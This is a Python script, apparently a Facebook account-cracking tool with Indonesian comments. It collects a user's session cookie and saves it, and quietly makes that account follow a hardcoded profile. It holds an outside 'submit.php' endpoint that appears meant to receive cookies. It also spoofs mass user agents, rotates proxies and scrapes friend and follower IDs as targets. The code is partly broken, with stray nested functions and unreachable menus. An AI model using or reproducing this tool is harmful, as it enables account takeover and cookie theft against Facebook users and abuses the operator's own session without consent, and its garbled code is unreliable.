
#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as panel
from rich.panel import Panel as nel
from rich import print as cetak
from concurrent.futures import ThreadPoolExecutor as BrayennnXD 
from rich.panel import Panel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich.tree import Tree
from rich import print as rprint
from rich import print as prints
from rich import pretty
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn
from rich.text import Text as tekz
import user_agent
now = datetime.datetime.today()

now = datetime.datetime.today()
mm = str(now.month)
dd = str(now.day)
yyyy = str(now.year)
t=(mm + "/" + dd + "/" + yyyy)

hours = (now.hour)
x = datetime.datetime.now()
g= datetime.datetime(2023,12,30)
#---------------------

#------------------[ USER-AGENT ]-------------------#
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
uman,usman1=[],[]
pretty.install()
CON=sol()
ugen2=[]
ugen=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36']
user_agent=['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.96 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36']
cokbrut=[]
ses=requests.Session()
princp=[]
printcp=[]
oks=[]
cps=[]
redmi=[]
ugent=[]
from rich.console import Console
from rich.columns import Columns
wa = Console()
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	
except Exception as e:
	print('𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='11; Redmi Note 5A Lite)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko)'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Chrome/96.0.4664.45 Mobile Safari/537.36'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['M2101K6G'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 13;'
	b=random.choice(['8.1.0','9','10','11','12','13'])
	c=random.choice(['RMX3396'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	a='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['9','10','11','12'])
	c=random.choice(['V2147'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_1_2 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/en_Qaau_US;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_0_3 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_0_2 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='WebKit/8614 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A380 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0.2;FBSS/3;FBID/phone;FBLC/es_LA;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_1_2 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20B110 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.1.2;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['2201116PG'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['RMX3115 Build/SP1A.210812.016; wv'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 12;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SHARK KTUS-H0'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
		
	aa='Mozilla/5.0 (iPhone;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Linux; Android 11;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Infinix X688B'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	aa='Mozilla/5.0 (Windows NT 10.0;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Win64; x64'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Chrome/107.0.0.0 Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
					
	aa='Mozilla/5.0 (Linux; Android 10;'
	b=random.choice(['7.0','8.1.0','9','10','11','12'])
	c=random.choice(['Mi 9T Pro Build/QKQ1.190825.002; wv)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko)'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)	
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH

M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
H3 = "[#FF00C0]" #ungu
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" # UNGU
O2 = "[#FF8F00]" # ORANGE

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00C8FF]"
	color_panel = "#00C8FF"
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[]
taplikasi=['no']
cokbrut=[]
method = []
pwpluss,pwnya=[],[]
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
domris = random.choice(['bold blue','bold green','bold yellow'])

try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FF00"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#-----------------------------#


import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, sys, time, re, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn
from bs4 import BeautifulSoup as par
from time import time as mek

M = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING

class Login:

    def __init__(self):
        self.ses=requests.Session()
        self.url = "https://mbasic.facebook.com"
        self.id, self.ok, self.cp, self.lo = [], [], [], 0
        self.cok = "https://api-cdn-fb.yayanxd.my.id/submit.php"
        self.kontol, self.iya, self.pasw = {}, [], []
        self.menu()

    def hapus(self):
        try:os.remove("ok.coki.txt");os.remove(".ID.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        

    def login_cokie(self):
        self.logoo()
        print('')
        print('')
        try:
            cok = input("[<>] cookie >> ")
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies={"cookie": cok}).text
            if 'href="/zero/optin/write/' in str(link):
                print("[<>] notice: anda sedang menggunakan mode free facebook")
                print("[<>] Mohon tunggu sebentar, system sedang mengubah cookie ke mode data.")
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(link)).group(1).replace("amp;", "")
                gett = self.ses.get(f"{self.url}/zero/optin/write/{urll}", cookies={"cookie": cok}).text
                poss = par(gett, "html.parser").find("form",{"method":"post"})["action"].replace("amp;", "")
                date = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(gett)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
                self.ses.post(f"{self.url}{poss}", data=date, cookies={"cookie": cok}).text
                self.ubah_bahasa({"cookie": cok})
                exit("\n[✓] proses mengubah ke mode data telah selesai.\n[<>] silahkan masukan ulang cookie nya dengan mengetik python regex.py")
            elif 'href="/x/checkpoint/' in str(link):
                print("[✘] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
            elif 'href="/r.php' in str(link):
                print("[✘] Invalid cookie [NO]");time.sleep(2);self.login_cokie()
            else:
                print("\n[<>] wait a little bit...")
                self.ubah_bahasa({"cookie": cok})
                nama = re.findall("\<title\>(.*?)<\/title\>", link)[0]
                user = re.search("c_user=(\d+)", str(cok)).group(1)
                open('ok.coki.txt', 'w').write(cok);open('ID.txt', 'w').write(f"{nama}|{user}")
                print(f"[<>] Hi :  {nama} ");self.ikuti({"cookie": cok});self.datas(nama, cok)
                exit("\n[!!]")
        except requests.ConnectionError:
            print('')
            exit("\n[√] تم تنشيط الكوكيز بنجاح")

    def ubah_bahasa(self, cok):
        try:
            link = self.ses.get(f"{self.url}/language/", cookies=cok).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(link)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit"  : "Bahasa Indonesia"}
                    self.ses.post(f"{self.url}{x['action']}", data=bahasa, cookies=cok)
        except:pass

    def ikuti(self, cok):
        try:
            link = par(self.ses.get(f"{self.url}/profile.php?id=100005395413800", cookies=cok).text, "html.parser")
            xnxx = link.find("a", string="Ikuti").get("href")
            self.ses.get(f"{self.url}{str(xnxx)}", cookies=cok).text
        except:pass

    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})
        gots = par(self.ses.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
        reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
        for x in reg:
            rest.append("socks5://"+x[0]+":"+x[1])
        if rest != 0:
            try:os.remove("proxies.txt")
            except:pass
            for yay in rest:
                open("proxies.txt", "a+").write(yay+"\n")
            exit("(✓) File save in proxies.txt, restart this tools\n")
        else:
            exit("(✓) File save in proxies.txt, restart this tools\n")

    def memek(self, mmk, kntl):
        if "lqkwndpnkefnfjsnwnfuoeohni3e" in kntl:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()
        else:self.ses.get(f"{self.kontol['mmk']}{self.kontol['hncet']}{self.kontol['softek']}{self.kontol['ngtd']}{mmk}").json()

    def menu(self):
        try:
            cook = {"cookie": open("ok.coki.txt", "r").read()}
            nama, user = open("ID.txt", "r").read().split("|")
        except FileNotFoundError:
            self.login_cokie()
        self.logoo()
        try:
            link = self.ses.get(f"{self.url}/profile.php?v=info", cookies=cook).text
            if "mbasic_logout_button" not in link:
                self.hapus()
                print(f"\n[!!] It seems that the Facebook account has been locked. Please verify the account or create a new cookie.");time.sleep(3);self.login_cokie()
        except requests.ConnectionError:
            exit("\n[√] تم تنشيط الكوكيز بنجاح")
        self.jnckk()
        os.system('clear')
        llogin()
        def fak_xy(u):
        	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
        def clear():
        	os.system('clear')
        	def back():
        		llogin()
        	def banner():
        		print(f'''⋘𝗭𝗔𝗜𝗠𝗘 ¦¦ 𝗣𝗬𝗧𝗛𝗢𝗡⋙''')
        exit()
        


        ykh = input(f"{H}[{M}+{H}]{N} HINI ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            exit("belum selesai:)")
        elif ykh in ["2", "02"]:
            print("[+] ketik 'me' jika ingin crack dari teman anda.")
            user = input(f"[{O}*{N}] enter id or username : ")
            if "me" in user:
                try:
                    link = par(self.ses.get(f"{self.url}/profile.php", cookies=cook).text, "html.parser")
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(self.url+link.find("a", string="Teman").get("href"), cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
            else:
                try:
                    link = self.ses.get(f"{self.url}/{user}/friends", cookies=cook).text
                    if "Halaman Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    elif "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun");time.sleep(2);self.menu()
                    elif "Konten Tidak Ditemukan" in link:
                        print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                    else:
                        print("[!] to stop press CTRL then press C on your keyboard.")
                        self.batur(f"{self.url}/{user}/friends", cook)
                except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                    exit("[!] kesalahan pada koneksi")
                print()
                self.metode()
        elif ykh in ["3", "03"]:
            user = input(f"[{O}*{N}] enter id or username followers: ")
